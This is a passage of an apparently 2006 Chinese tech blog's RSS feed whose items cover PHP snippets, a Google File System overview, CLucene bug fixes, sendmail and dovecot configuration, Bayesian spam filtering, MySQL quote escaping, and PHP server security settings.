就是说将/tmp目录下的origine_image.jpg图片重新缩放成100×100的大小保存在/tmp目录下文件名为small_100_100.jpg，图片质量为90。
具体更多的，用的时候就知道了，还可以用php把imagemagick编辑成为php的模块 </description>
    </item>
    
    <item>
      <title>PHP判断浏览器类型和系统语言</title>
      <link>http://example.org/2006/06/05/phpe588a4e696ade6b58fe8a788e599a8e7b1bbe59e8be5928ce7b3bbe7bb9fe8afade8a880/</link>
      <pubDate>Mon, 05 Jun 2006 00:52:27 +0000</pubDate>
      
      <guid>http://example.org/2006/06/05/phpe588a4e696ade6b58fe8a788e599a8e7b1bbe59e8be5928ce7b3bbe7bb9fe8afade8a880/</guid>
      <description>判断浏览器类型 echo $_SERVER[&amp;ldquo;HTTP_USER_AGENT&amp;rdquo;]; ?&amp;gt; 判断系统语言 echo $_SERVER[&amp;ldquo;HTTP_ACCEPT_LANGUAGE&amp;rdquo;]; ?&amp;gt;</description>
    </item>
    
    <item>
      <title>PHP静态类</title>
      <link>http://example.org/2006/05/31/phpe99d99e68081e7b1bb/</link>
      <pubDate>Wed, 31 May 2006 12:05:00 +0000</pubDate>
      
      <guid>http://example.org/2006/05/31/phpe99d99e68081e7b1bb/</guid>
      <description></description>
    </item>
    
    <item>
      <title>生成静态页面的PHP类</title>
      <link>http://example.org/2006/05/31/e7949fe68890e99d99e68081e9a1b5e99da2e79a84phpe7b1bb/</link>
      <pubDate>Wed, 31 May 2006 11:54:57 +0000</pubDate>
      
      <guid>http://example.org/2006/05/31/e7949fe68890e99d99e68081e9a1b5e99da2e79a84phpe7b1bb/</guid>
      <description></description>
    </item>
    
    <item>
      <title>apache mod_limitipconn 的配置方法</title>
      <link>http://example.org/2006/05/26/apache-mod_limitipconn-e79a84e9858de7bdaee696b9e6b395/</link>
      <pubDate>Fri, 26 May 2006 18:25:01 +0000</pubDate>
      
      <guid>http://example.org/2006/05/26/apache-mod_limitipconn-e79a84e9858de7bdaee696b9e6b395/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Google文件系统</title>
      <link>http://example.org/2006/05/26/googlee69687e4bbb6e7b3bbe7bb9f/</link>
      <pubDate>Fri, 26 May 2006 18:22:22 +0000</pubDate>
      
      <guid>http://example.org/2006/05/26/googlee69687e4bbb6e7b3bbe7bb9f/</guid>
      <description>转载自互连网 Google文件系统
GFS是一个可扩展的分布式文件系统，用于大型的、分布式的、对大量数据进行访问的应用。它运行于廉价的普通硬件上，但可以提供容错功能。它可以给大量的用户提供总体性能较高的服务。 1、设计概览 （1）设计想定 GFS与过去的分布式文件系统有很多相同的目标，但GFS的设计受到了当前及预期的应用方面的工作量及技术环境的驱动，这反映了它与早期的文件系统明显不同的设想。这就需要对传统的选择进行重新检验并进行完全不同的设计观点的探索。 GFS与以往的文件系统的不同的观点如下： 1、部件错误不再被当作异常，而是将其作为常见的情况加以处理。因为文件系统由成百上千个用于存储的机器构成，而这些机器是由廉价的普通部件组成并被大量的客户机访问。部件的数量和质量使得一些机器随时都有可能无法工作并且有一部分还可能无法恢复。所以实时地监控、错误检测、容错、自动恢复对系统来说必不可少。 2、按照传统的标准，文件都非常大。长度达几个GB的文件是很平常的。每个文件通常包含很多应用对象。当经常要处理快速增长的、包含数以万计的对象、长度达TB的数据集时，我们很难管理成千上万的KB规模的文件块，即使底层文件系统提供支持。因此，设计中操作的参数、块的大小必须要重新考虑。对大型的文件的管理一定要能做到高效，对小型的文件也必须支持，但不必优化。 3、大部分文件的更新是通过添加新数据完成的，而不是改变已存在的数据。在一个文件中随机的操作在实践中几乎不存在。一旦写完，文件就只可读，很多数据都有这些特性。一些数据可能组成一个大仓库以供数据分析程序扫描。有些是运行中的程序连续产生的数据流。有些是档案性质的数据，有些是在某个机器上产生、在另外一个机器上处理的中间数据。由于这些对大型文件的访问方式，添加操作成为性能优化和原子性保证的焦点。而在客户机中缓存数据块则失去了吸引力。 4、工作量主要由两种读操作构成：对大量数据的流方式的读操作和对少量数据的随机方式的读操作。在前一种读操作中，可能要读几百KB，通常达 1MB和更多。来自同一个客户的连续操作通常会读文件的一个连续的区域。随机的读操作通常在一个随机的偏移处读几个KB。性能敏感的应用程序通常将对少量数据的读操作进行分类并进行批处理以使得读操作稳定地向前推进，而不要让它来来回回的读。 5、工作量还包含许多对大量数据进行的、连续的、向文件添加数据的写操作。所写的数据的规模和读相似。一旦写完，文件很少改动。在随机位置对少量数据的写操作也支持，但不必非常高效。 6、系统必须高效地实现定义完好的大量客户同时向同一个文件的添加操作的语义。 （2）系统接口 GFS提供了一个相似地文件系统界面，虽然它没有向POSIX那样实现标准的API。文件在目录中按层次组织起来并由路径名标识。 （3）体系结构： 一个GFS集群由一个master和大量的chunkserver构成，并被许多客户（Client）访问。如图1所示。Master和 chunkserver通常是运行用户层服务进程的Linux机器。只要资源和可靠性允许，chunkserver和client可以运行在同一个机器上。 文件被分成固定大小的块。每个块由一个不变的、全局唯一的64位的chunk－handle标识，chunk－handle是在块创建时由 master分配的。ChunkServer将块当作Linux文件存储在本地磁盘并可以读和写由chunk－handle和位区间指定的数据。出于可靠性考虑，每一个块被复制到多个chunkserver上。默认情况下，保存3个副本，但这可以由用户指定。 Master维护文件系统所以的元数据（metadata），包括名字空间、访问控制信息、从文件到块的映射以及块的当前位置。它也控制系统范围的活动，如块租约（lease）管理，孤儿块的垃圾收集，chunkserver间的块迁移。Master定期通过HeartBeat消息与每一个 chunkserver通信，给chunkserver传递指令并收集它的状态。 与每个应用相联的GFS客户代码实现了文件系统的API并与master和chunkserver通信以代表应用程序读和写数据。客户与master的交换只限于对元数据（metadata）的操作，所有数据方面的通信都直接和chunkserver联系。 客户和chunkserver都不缓存文件数据。因为用户缓存的益处微乎其微，这是由于数据太多或工作集太大而无法缓存。不缓存数据简化了客户程序和整个系统，因为不必考虑缓存的一致性问题。但用户缓存元数据（metadata）。Chunkserver也不必缓存文件，因为块时作为本地文件存储的。 （4）单master。 只有一个master也极大的简化了设计并使得master可以根据全局情况作出先进的块放置和复制决定。但是我们必须要将master对读和写的参与减至最少，这样它才不会成为系统的瓶颈。Client从来不会从master读和写文件数据。Client只是询问master它应该和哪个 chunkserver联系。Client在一段限定的时间内将这些信息缓存，在后续的操作中Client直接和chunkserver交互。 以图1解释一下一个简单的读操作的交互。 1、client使用固定的块大小将应用程序指定的文件名和字节偏移转换成文件的一个块索引（chunk index）。 2、给master发送一个包含文件名和块索引的请求。 3、master回应对应的chunk handle和副本的位置（多个副本）。 4、client以文件名和块索引为键缓存这些信息。（handle和副本的位置）。 5、Client 向其中一个副本发送一个请求，很可能是最近的一个副本。请求指定了chunk handle（chunkserver以chunk handle标识chunk）和块内的一个字节区间。 6、除非缓存的信息不再有效（cache for a limited time）或文件被重新打开，否则以后对同一个块的读操作不再需要client和master间的交互。 通常Client可以在一个请求中询问多个chunk的地址，而master也可以很快回应这些请求。 （5）块规模： 块规模是设计中的一个关键参数。我们选择的是64MB，这比一般的文件系统的块规模要大的多。每个块的副本作为一个普通的Linux文件存储，在需要的时候可以扩展。 块规模较大的好处有： 1、减少client和master之间的交互。因为读写同一个块只是要在开始时向master请求块位置信息。对于读写大型文件这种减少尤为重要。即使对于访问少量数据的随机读操作也可以很方便的为一个规模达几个TB的工作集缓缓存块位置信息。 2、Client在一个给定的块上很可能执行多个操作，和一个chunkserver保持较长时间的TCP连接可以减少网络负载。 3、这减少了master上保存的元数据（metadata）的规模，从而使得可以将metadata放在内存中。这又会带来一些别的好处。 不利的一面： 一个小文件可能只包含一个块，如果很多Client访问改文件的话，存储这些块的chunkserver将成为访问的热点。但在实际应用中，应用程序通常顺序地读包含多个块的文件，所以这不是一个主要问题。 （6）元数据（metadata）： master存储了三中类型的metadata：文件的名字空间和块的名字空间，从文件到块的映射，块的副本的位置。所有的metadata都放在内存中。前两种类型的metadata通过向操作日志登记修改而保持不变，操作日志存储在master的本地磁盘并在几个远程机器上留有副本。使用日志使得我们可以很简单地、可靠地更新master的状态，即使在master崩溃的情况下也不会有不一致的问题。相反，mater在每次启动以及当有 chuankserver加入的时候询问每个chunkserver的所拥有的块的情况。 A、内存数据结构： 因为metadata存储在内存中，所以master的操作很快。进一步，master可以轻易而且高效地定期在后台扫描它的整个状态。这种定期地扫描被用于实现块垃圾收集、chunkserver出现故障时的副本复制、为平衡负载和磁盘空间而进行的块迁移。 这种方法的一个潜在的问题就是块的数量也即整个系统的容量是否受限与master的内存。实际上，这并不是一个严重的问题。Master为每个 64MB的块维护的metadata不足64个字节。除了最后一块，文件所有的块都是满的。类似的，每个文件的名字空间数据也不足64个字节，因为文件名是以一种事先确定的压缩方式存储的.如果要支持更大的文件系统，那么增加一些内存的方法对于我们将元数据（metadata）保存在内存种所获得的简单性、可靠性、高性能和灵活性来说，这只是一个很小的代价。 B、块位置： master并不为chunkserver所拥有的块的副本的保存一个不变的记录。它在启动时通过简单的查询来获得这些信息。Master可以保持这些信息的更新，因为它控制所有块的放置并通过HeartBeat消息来监控chunkserver的状态。 这样做的好处：因为chunkserver可能加入或离开集群、改变路径名、崩溃、重启等，一个集群重有成百个server，这些事件经常发生，这种方法就排除了master与chunkserver之间的同步问题。 另一个原因是：只有chunkserver才能确定它自己到底有哪些块，由于错误，chunkserver中的一些块可能会很自然的消失，这样在master中就没有必要为此保存一个不变的记录。 C、操作日志： 操作日志包含了对metadata所作的修改的历史记录。它作为逻辑时间线定义了并发操作的执行顺序。文件、块以及它们的版本号都由它们被创建时的逻辑时间而唯一地、永久地被标识。 操作日志是如此的重要，我们必须要将它可靠地保存起来，并且只有在metadata的改变固定下来之后才将变化呈现给用户。所以我们将操作日志复制到数个远程的机器上，并且只有在将相应的日志记录写到本地和远程的磁盘上之后才回答用户的请求。 Master可以用操作日志来恢复它的文件系统的状态。为了将启动时间减至最小，日志就必须要比较小。每当日志的长度增长到超过一定的规模后，master就要检查它的状态，它可以从本地磁盘装入最近的检查点来恢复状态。 创建一个检查点比较费时，master的内部状态是以一种在创建一个检查点时并不耽误即将到来的修改操作的方式来组织的。Master切换到一个新的日子文件并在一个单独的线程中创建检查点。这个新的检查点记录了切换前所有的修改。在一个有数十万文件的集群中用一分钟左右就能完成。创建完后，将它写入本地和远程的磁盘。 （7）数据完整性 名字空间的修改必须是原子性的，它们只能有master处理：名字空间锁保证了操作的原子性和正确性，而master的操作日志在全局范围内定义了这些操作的顺序。 文件区间的状态在修改之后依赖于修改的类型，不论操作成功还是失败，也不论是不是并发操作。如果不论从哪个副本上读，所有的客户都看到同样的数据，那么文件的这个区域就是一致的。如果文件的区域是一致的并且用户可以看到修改操作所写的数据，那么它就是已定义的。如果修改是在没有并发写操作的影响下完成的，那么受影响的区域是已定义的，所有的client都能看到写的内容。成功的并发写操作是未定义但却是一致的。失败的修改将使区间处于不一致的状态。 Write操作在应用程序指定的偏移处写入数据，而record append操作使得数据（记录）即使在有并发修改操作的情况下也至少原子性的被加到GFS指定的偏移处，偏移地址被返回给用户。 在一系列成功的修改操作后，最后的修改操作保证文件区域是已定义的。GFS通过对所有的副本执行同样顺序的修改操作并且使用块版本号检测过时的副本（由于chunkserver退出而导致丢失修改）来做到这一点。 因为用户缓存了会位置信息，所以在更新缓存之前有可能从一个过时的副本中读取数据。但这有缓存的截止时间和文件的重新打开而受到限制。 在修改操作成功后，部件故障仍可以是数据受到破坏。GFS通过master和chunkserver间定期的handshake，借助校验和来检测对数据的破坏。一旦检测到，就从一个有效的副本尽快重新存储。只有在GFS检测前，所有的副本都失效，这个块才会丢失。 2、系统交互 （1）租约（lease）和修改顺序： （2）数据流 我们的目标是充分利用每个机器的网络带宽，避免网络瓶颈和延迟 为了有效的利用网络，我们将数据流和控制流分离。数据是以流水线的方式在选定的chunkerserver链上线性的传递的。每个机器的整个对外带宽都被用作传递数据。为避免瓶颈，每个机器在收到数据后，将它收到数据尽快传递给离它最近的机器。 （3）原子性的record Append： GFS提供了一个原子性的添加操作：record append。在传统的写操作中，client指定被写数据的偏移位置，向同一个区间的并发的写操作是不连续的：区间有可能包含来自多个client的数据碎片。在record append中， client只是指定数据。GFS在其选定的偏移出将数据至少原子性的加入文件一次，并将偏移返回给client。 在分布式的应用中，不同机器上的许多client可能会同时向一个文件执行添加操作，添加操作被频繁使用。如果用传统的write操作，可能需要额外的、复杂的、开销较大的同步，例如通过分布式锁管理。在我们的工作量中，这些文件通常以多个生产者单个消费者队列的方式或包含从多个不同 client的综合结果。 Record append和前面讲的write操作的控制流差不多，只是在primary上多了一些逻辑判断。首先，client将数据发送到文件最后一块的所有副本上。然后向primary发送请求。Primary检查添加操作是否会导致该块超过最大的规模（64M）。如果这样，它将该块扩充到最大规模，并告诉其它副本做同样的事，同时通知client该操作需要在下一个块上重新尝试。如果记录满足最大规模的要求，primary就会将数据添加到它的副本上，并告诉其它的副本在在同样的偏移处写数据，最后primary向client报告写操作成功。如果在任何一个副本上record append操作失败，client将重新尝试该操作。这时候，同一个块的副本可能包含不同的数据，因为有的可能复制了全部的数据，有的可能只复制了部分。GFS不能保证所有的副本每个字节都是一样的。它只保证每个数据作为一个原子单元被写过至少一次。这个是这样得出的：操作要是成功，数据必须在所有的副本上的同样的偏移处被写过。进一步，从这以后，所有的副本至少和记录一样长，所以后续的记录将被指定到更高的偏移处或者一个不同的块上，即使另一个副本成了primary。根据一致性保证，成功的record append操作的区间是已定义的。而受到干扰的区间是不一致的。 （4）快照（snapshot） 快照操作几乎在瞬间构造一个文件和目录树的副本，同时将正在进行的其他修改操作对它的影响减至最小。 我们使用copy-on-write技术来实现snapshot。当master受到一个snapshot请求时，它首先将要snapshot的文件上块上的lease。这使得任何一个向这些块写数据的操作都必须和master交互以找到拥有lease的副本。这就给master一个创建这个块的副本的机会。 副本被撤销或终止后，master在磁盘上登记执行的操作，然后复制源文件或目录树的metadata以对它的内存状态实施登记的操作。这个新创建的snapshot文件和源文件（其metadata）指向相同的块（chunk）。 Snapshot之后，客户第一次向chunk c写的时候，它发一个请求给master以找到拥有lease的副本。Master注意到chunk c的引用记数比1大，它延迟对用户的响应，选择一个chunk handle C’,然后要求每一有chunk c的副本的chunkserver创建一个块C’。每个chunkserver在本地创建chunk C’避免了网络开销。从这以后和对别的块的操作没有什么区别。 3、MASTER操作 MASTER执行所有名字空间的操作，除此之外，他还在系统范围管理数据块的复制：决定数据块的放置方案，产生新数据块并将其备份，和其他系统范围的操作协同来确保数据备份的完整性，在所有的数据块服务器之间平衡负载并收回没有使用的存储空间。 3.</description>
    </item>
    
    <item>
      <title>CLUCENE-0.9.10 BUG及修改方法列表</title>
      <link>http://example.org/2006/05/26/clucene-0910-buge58f8ae4bfaee694b9e696b9e6b395e58897e8a1a8/</link>
      <pubDate>Fri, 26 May 2006 18:12:34 +0000</pubDate>
      
      <guid>http://example.org/2006/05/26/clucene-0910-buge58f8ae4bfaee694b9e696b9e6b395e58897e8a1a8/</guid>
      <description>IndexWriter.cpp文件IndexWriter::close函数中，如果指定目录在退出时不关闭，则不能删除目录对象。
修改： if ( closeDir ){ directory-&amp;gt;close(); } _CLDECDELETE(directory); 为 if ( closeDir ){ directory-&amp;gt;close(); _CLDECDELETE(directory); } IndexWriter.cpp文件IndexWriter ::optimize函数中，如果 segmentInfo-&amp;gt;size() == 0，则会导致异常。 修改： flushRamSegments(); 为 flushRamSegments(); if(segmentInfos-&amp;gt;size() == 0) return; 修改IndexWriter::addIndexes(Directory** dirs)函数，因为SegmentInfos对象在析构时会删除所有对象，因此在函数退出时会导致无效的指针。 修改 // start with zero or 1 seg so optimize the current optimize(); //Iterate through the directories int32_t i = 0; while ( dirs[i] != NULL ) { // DSR: Changed SegmentInfos constructor arg (see bug discussion below). SegmentInfos sis(false); sis.</description>
    </item>
    
    <item>
      <title>FC4的dovecot套件無法啟動</title>
      <link>http://example.org/2006/05/25/fc4e79a84dovecote5a597e4bbb6e784a1e6b395e5959fe58b95/</link>
      <pubDate>Thu, 25 May 2006 14:02:22 +0000</pubDate>
      
      <guid>http://example.org/2006/05/25/fc4e79a84dovecote5a597e4bbb6e784a1e6b395e5959fe58b95/</guid>
      <description>fc4下 dovecot-0.99.14-4.fc4.i386.rpm 測試正常歐 上方也有連結可以更新 不過這版本就是fc4內附的版本阿 還是樓主 本身沒從光碟安裝這套件 是另外下載的? 另外 關於sasl安裝 教學如下 以下是我從我的筆記上 擷取出來的 有疑問再發問歐 (我也不一定能解決 ) 安裝前 確認防火牆打開了 110 143 25 三個 沒開的 執行 #system-config-securitylevel-tui 來打開 還有sendmail已經正確安裝 先確認有無安裝 #代表登入root時 #rpm -qa | grep sasl 檢查以下三個rpm的安裝情形 cyrus-sasl cyrus-sasl-md5 cyrus-sasl-plain 沒有的話 就要從光碟裡找找 編輯 /etc/mail/sendmail.mc 檔 找到 dnl TRUST_AUTH_MECH(&amp;lsquo;EXTERNAL DIGEST-MD5?&amp;hellip;&amp;hellip;..&amp;rsquo;)dnl dnl define(&amp;lsquo;confAUTH_MECHANISMS&amp;rsquo;, &amp;lsquo;EX&amp;hellip;&amp;hellip;LOGIN PLAIN&amp;rsquo;).. 以上&amp;hellip;.是我偷懶懶的打字 刪去 行首的 dnl與緊接的後方空白 修改 DAEMON_OPTIONS(&amp;rsquo;&amp;hellip;..ADDR=0.0.0.0,&amp;hellip;.&amp;rsquo;)dnl 把127.0.0.1&amp;ndash;&amp;gt;0.0.0.0 產生sendmail.cf 先把 /etc/mail/sendmail.mc 複製到 /usr/share/sendmail-cf/cf/下 終端機內 切換目錄到 /usr/share/sendmail-cf/cf/下 利用 #sh Build sendmail.cf 來產生sendmail.</description>
    </item>
    
    <item>
      <title>sendmail 配置</title>
      <link>http://example.org/2006/05/25/sendmail-e9858de7bdae/</link>
      <pubDate>Thu, 25 May 2006 13:58:15 +0000</pubDate>
      
      <guid>http://example.org/2006/05/25/sendmail-e9858de7bdae/</guid>
      <description>作者：Christopher Shumway. sendmail(8) 是 FreeBSD 中的默认邮件传输代理 (MTA)。 sendmail 的任务是从邮件用户代理 (MUA) 接收邮件然后根据配置文件的定义把它们送给配置好的的寄送程序。 sendmail 也能接受网络连接，并且发送邮件到本地邮箱或者发送它到其它程序。 sendmail 使用下列配置文件： 文件名功能 /etc/mail/access sendmail 访问数据库文件 /etc/mail/aliases 邮箱别名 /etc/mail/local-host-names sendmail 接收邮件主机列表 /etc/mail/mailer.conf 邮寄配置程序 /etc/mail/mailertable 邮件分发列表 /etc/mail/sendmail.cf sendmail的主配置文件 /etc/mail/virtusertable 虚拟用户和域列表 25.3.1 /etc/mail/access
访问数据库定义了什么主机或者 IP 地址可以访问本地邮件服务器和它们是哪种类型的访问。主机可能会列出 OK、 REJECT、RELAY 或者简单的通过 sendmail 的出错处理程序检测一个给定的邮件错误。 主机默认列出 OK，允许传送邮件到主机， 只要邮件的最后目的地是本地主机。列出 REJECT 将拒绝所有的邮件连接。如果带有 RELAY 选项的主机将被允许通过这个邮件服务器发送邮件到任何地方。 例 25-1. 配置 sendmail 的访问许可数据库 cyberspammer.com 550 We do not accept mail from spammers FREE.STEALTH.MAILER@ 550 We do not accept mail from spammers another.</description>
    </item>
    
    <item>
      <title>strnzhcpy 中文处理（c防止汉字截断）</title>
      <link>http://example.org/2006/05/24/strnzhcpy-e4b8ade69687e5a484e79086efbc88ce998b2e6ada2e6b189e5ad97e688aae696adefbc89/</link>
      <pubDate>Wed, 24 May 2006 06:15:51 +0000</pubDate>
      
      <guid>http://example.org/2006/05/24/strnzhcpy-e4b8ade69687e5a484e79086efbc88ce998b2e6ada2e6b189e5ad97e688aae696adefbc89/</guid>
      <description></description>
    </item>
    
    <item>
      <title>PHP 将 HTML 转化为 WML2005</title>
      <link>http://example.org/2006/05/24/php-e5b086-html-e8bdace58c96e4b8ba-wml2005/</link>
      <pubDate>Wed, 24 May 2006 06:13:57 +0000</pubDate>
      
      <guid>http://example.org/2006/05/24/php-e5b086-html-e8bdace58c96e4b8ba-wml2005/</guid>
      <description></description>
    </item>
    
    <item>
      <title>相似度的问题</title>
      <link>http://example.org/2006/05/23/e79bb8e4bcbce5baa6e79a84e997aee9a298/</link>
      <pubDate>Tue, 23 May 2006 14:20:21 +0000</pubDate>
      
      <guid>http://example.org/2006/05/23/e79bb8e4bcbce5baa6e79a84e997aee9a298/</guid>
      <description>贝叶斯算法介绍 一． 贝叶斯过滤算法的基本步骤
收集大量的垃圾邮件和非垃圾邮件，建立垃圾邮件集和非垃圾邮件集。 提取邮件主题和邮件体中的独立字串例如 ABC32，￥234等作为TOKEN串并统计提取出的TOKEN串出现的次数即字频。按照上述的方法分别处理垃圾邮件集和非垃圾邮件集中的所有邮件。 每一个邮件集对应一个哈希表，hashtable_good对应非垃圾邮件集而hashtable_bad对应垃圾邮件集。表中存储TOKEN串到字频的映射关系。 计算每个哈希表中TOKEN串出现的概率P=（某TOKEN串的字频）/（对应哈希表的长度） 综合考虑hashtable_good和hashtable_bad，推断出当新来的邮件中出现某个TOKEN串时，该新邮件为垃圾邮件的概率。数学表达式为： A事件&amp;mdash;-邮件为垃圾邮件; t1,t2 …….tn代表TOKEN串 则P（A|ti）表示在邮件中出现TOKEN串ti时，该邮件为垃圾邮件的概率。 设 P1（ti）=（ti在hashtable_good中的值） P2（ti）=（ti在hashtable_ bad中的值） 则 P（A|ti）= P1（ti）/[（P1（ti）+ P2（ti）]； 建立新的哈希表 hashtable_probability存储TOKEN串ti到P（A|ti）的映射 至此，垃圾邮件集和非垃圾邮件集的学习过程结束。根据建立的哈希表 hashtable_probability可以估计一封新到的邮件为垃圾邮件的可能性。 当新到一封邮件时，按照步骤2）生成TOKEN串。查询hashtable_probability得到该TOKEN 串的键值。 假设由该邮件共得到N个TOKEN串，t1,t2…….tn, hashtable_probability中对应的值为P1，P2，。。。。。。PN， P(A|t1 ,t2, t3……tn)表示在邮件中同时出现多个TOKEN串t1,t2…….tn时，该邮件为垃圾邮件的概率。 由复合概率公式可得 P(A|t1 ,t2, t3……tn)=（P1P2。。。。PN）/[P1P2。。。。。PN+（1-P1）（1-P2）。。。（1-PN）] 当P(A|t1 ,t2, t3……tn)超过预定阈值时，就可以判断邮件为垃圾邮件。 二． 贝叶斯过滤算法举例
例如：一封含有“法轮功”字样的垃圾邮件 A 和 一封含有“法律”字样的非垃圾邮件B 根据邮件A生成hashtable_ bad，该哈希表中的记录为 法：1次 轮：1次 功：1次 计算得在本表中： 法出现的概率为0。3 轮出现的概率为0。3 功出现的概率为0。3 根据邮件B生成hashtable_good，该哈希表中的记录为： 法：1 律：1 计算得在本表中： 法出现的概率为0。5 律出现的概率为0。5 综合考虑两个哈希表，共有四个TOKEN串： 法 轮 功 律 当邮件中出现“法”时，该邮件为垃圾邮件的概率为： P=0。3/（0。3+0。5）=0。375 出现“轮”时： P=0。3/（0。3+0）=1 出现“功“时： P=0。3/（0。3+0）=1 出现“律”时 P=0/（0+0。5）=0； 由此可得第三个哈希表：hashtable_probability 其数据为： 法：0。375 轮：1 功：1 律：0</description>
    </item>
    
    <item>
      <title>mysql转义字符的问题</title>
      <link>http://example.org/2006/05/22/mysqle8bdace4b989e5ad97e7aca6e79a84e997aee9a298/</link>
      <pubDate>Mon, 22 May 2006 07:54:15 +0000</pubDate>
      
      <guid>http://example.org/2006/05/22/mysqle8bdace4b989e5ad97e7aca6e79a84e997aee9a298/</guid>
      <description>在php.ini中设置了 magic_quotes_gpc = On
或者在程序运行时进行了转义字符
那么存入mysql数据表中的 ‘ 将会变成 ’
反过来显示的时候
将会用到下面的函数进行处理。
function un_magic_quote($value) { $value = is_array($value) ? array_map(&amp;quot;un_magic_quote&amp;quot;, $value) : stripslashes($value); return $value; } 参数$value的类型可以是数组或者字符串
这样得出来的值就会变成 ‘ 而不是 ’ 了。
在用SELECT &amp;hellip; LIKE &amp;hellip; 这个字段的时候，
要这样写
SELECT * FROM TABLE_NAME WHERE TABLE_FIELD LIKE “%\’%”
这样可以把带有 ’ 的数据搜索出来，注意这里是”而非’</description>
    </item>
    
    <item>
      <title>不错的对联广告</title>
      <link>http://example.org/2006/05/22/e4b88de99499e79a84e5afb9e88194e5b9bfe5918a/</link>
      <pubDate>Mon, 22 May 2006 04:59:57 +0000</pubDate>
      
      <guid>http://example.org/2006/05/22/e4b88de99499e79a84e5afb9e88194e5b9bfe5918a/</guid>
      <description></description>
    </item>
    
    <item>
      <title>mysql出现这个不知怎么回事</title>
      <link>http://example.org/2006/05/20/mysqle587bae78eb0e8bf99e4b8aae4b88de79fa5e6808ee4b988e59b9ee4ba8b/</link>
      <pubDate>Sat, 20 May 2006 17:12:01 +0000</pubDate>
      
      <guid>http://example.org/2006/05/20/mysqle587bae78eb0e8bf99e4b8aae4b88de79fa5e6808ee4b988e59b9ee4ba8b/</guid>
      <description>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;lsquo;Times New Roman&amp;rsquo;; mso-hansi-font-family: &amp;lsquo;Times New Roman
真服了</description>
    </item>
    
    <item>
      <title>下拉菜单出现在flash下面</title>
      <link>http://example.org/2006/05/20/e4b88be68b89e88f9ce58d95e587bae78eb0e59ca8flashe4b88be99da2/</link>
      <pubDate>Sat, 20 May 2006 10:37:29 +0000</pubDate>
      
      <guid>http://example.org/2006/05/20/e4b88be68b89e88f9ce58d95e587bae78eb0e59ca8flashe4b88be99da2/</guid>
      <description>可以这样理解 下拉菜单通过执行一次显示命令出现在画面上,但是FLASH这样的动画不停地在执行显示命令(因为动画是动的呵呵),每次都更新了画面的显示,所以如果两者重叠,就会因为FLASH显示了新图象画面,下拉菜单的画面被覆盖. 解决办法: 方法一:把swf文件属性设置成透明，在flash参数里面加上 ，如果你用dreamweaver，选中那个swf文件，属性面板上会有一个“参数&amp;hellip;”按钮（在面板的最下面），点一下，在弹出框里左边“参数”下面加上wmode，对应右边的值输入transparent，确定后就可以了 方法二:dreamweaver有个排列的，把swf文件设置在最底层不就行了！</description>
    </item>
    
    <item>
      <title>编写PHP的安全策略</title>
      <link>http://example.org/2006/05/18/e7bc96e58699phpe79a84e5ae89e585a8e7ad96e795a5/</link>
      <pubDate>Thu, 18 May 2006 12:26:33 +0000</pubDate>
      
      <guid>http://example.org/2006/05/18/e7bc96e58699phpe79a84e5ae89e585a8e7ad96e795a5/</guid>
      <description>PHP最初是被称作Personal Home Page，后来随着PHP成为一种非常流行的脚本语言，名称也随之改变了，叫做Professional HyperText PreProcessor。以PHP4.2为例支持它的WEB服务器有：Apache, Microsoft Internet information Sereve, Microsoft Personal web Server,AOLserver,Netscape Enterprise 等等。 PHP是一种功能强大的语言和解释器，无论是作为模块方式包含到web服务器里安装的还是作为单独的CGI程序程序安装的，都能访问文件、执行命令或者在服务器上打开链接。而这些特性都使得PHP运行时带来安全问题。虽然PH P是特意设计成一种比用Perl或C语言所编写的CGI程序要安全的语言，但正确使用编译时和运行中的一些配置选项以及恰当的应用编码将会保证其运行的安全性。 一、安全从开始编译PHP开始。 在编译PHP之前，首先确保操作系统的版本是最新的，必要的补丁程序必须安装过。另外使用编译的PHP也应当是最新的版本，关于PHP的安全漏洞也常有发现，请使用最新版本，如果已经安装过PHP请升级为最新版本：4.2.3 相关链接：http://security.e-matters.de/advisories/012002.html 安装编译PHP过程中要注意的3个问题： 1、只容许CGI文件从特定的目录下执行：首先把处理CGI脚本的默认句柄删除，然后在要执行CGI脚本的目录在http.conf 文件中加入ScriptAlias指令。 #Addhadler cgi-script .cgi ScriptAlias /cgi-bin/ &amp;ldquo;/usr/local/apache/cgi-bin/&amp;rdquo;
AllowOverride None Options None Order allow,deny Allow from all
AllowOverride None Options ExecCGI Order allow,deny Allow from all
SriptAlias的第一个参数指明在Web中的可用相对路径，第二个参数指明脚本放在服务器的目录。应该对每个目录 别名都用Directory，这样可使得除系统管理员之外的人不知道Web服务器上CGI脚本的清单。 Directory允许用户创建自己的CGI脚本。也可用SriptAliasMatch，但Directory更容易使用。 允许用户创建自己 CGI脚本可能会导致安全问题，你可能不希望用户创建自己的CGI。 Apache默认配置是注释掉cgi—script的处理句柄，但有／cgi-bin目录使用SriptAlias和Directory指令。 你也可禁止CGI执行，但仍允许执行PHP脚本。 2．把PHP解析器放在web目录外 把PHP解析器放在Web目录树外是非常重要的做法。这样可以防止web服务器对PHP的解析器的滥用。特别是 不要把PHP解析器放在cgi－bin或允许执行CGI程序的目录下。然而，使用Action解析脚本是不可能的，因为用Action指令时，PHP解析器大多数要放在能够执行CGI的目录下只有当PHP脚本作为CGI程序执行时，才能把PHP解析器放在Web目录树之外。 如果希望PHP脚本作为CGI程序执行(这们可以把PHP解析器放在Web目录树之外)，可以这样： ( 1)所有的PHP脚本必须位于能执行CGI程序的目录里。 ( 2)脚本必须是可执行的(仅在UNIX/Linux机器里)。 (3)脚本必须在文件头包括PHP解析器的路径。 你可用下面命令使PHP脚本为可执行： #chmod +x test.php4 这样使在当前目录下的文件名为test．PhP4的脚本变为可执行。 下面是一个能作为CGI程序运行的PHP脚的小例子。 #!/usr/local/bin/php echo &amp;ldquo;This is a my small cgi program” 3.</description>
    </item>
    
    <item>
      <title>十分钟快速架设Linux下的WebMail</title>
      <link>http://example.org/2006/05/18/e58d81e58886e9929fe5bfabe9809fe69eb6e8aebelinuxe4b88be79a84webmail/</link>
      <pubDate>Thu, 18 May 2006 11:44:56 +0000</pubDate>
      
      <guid>http://example.org/2006/05/18/e58d81e58886e9929fe5bfabe9809fe69eb6e8aebelinuxe4b88be79a84webmail/</guid>
